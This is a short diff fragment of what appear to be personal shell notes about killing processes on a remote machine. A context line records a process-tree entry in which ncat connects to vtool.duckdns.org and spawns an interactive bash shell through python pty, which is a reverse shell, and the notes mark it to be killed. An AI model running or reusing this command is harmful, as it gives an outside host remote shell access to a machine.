@@ -46,3 +46,4 @@ pkill mosh-server
 ├─ncat,4829 -w 15s -i 1800s vtool.duckdns.org 9087 -c echo Sat May 23 10:57:25 UTC 2020 started connection; echo fff55010d916; python -c 'import pty; pty.spawn(["/bin/bash", "-li"])'
 kill net ncat which spwan the pty at last ~
 
+TPU_NAME to check tpu
